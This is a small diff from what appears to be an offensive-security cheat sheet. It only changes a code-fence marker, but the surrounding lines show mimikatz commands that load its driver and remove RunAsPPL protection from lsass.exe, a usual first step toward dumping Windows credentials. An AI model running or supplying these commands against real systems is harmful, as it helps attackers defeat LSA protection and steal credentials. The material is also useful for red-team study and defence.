@@ -146,7 +146,7 @@ patching AMSI from Powershell6 :
 
 RunAsPPL is an additional LSA protection to prevent reading memory and code injection by non-protected processes.
 
-```bash
+```
 mimikatz # privilege::debug
 mimikatz # !+
 mimikatz # !processprotect /process:lsass.exe /remove
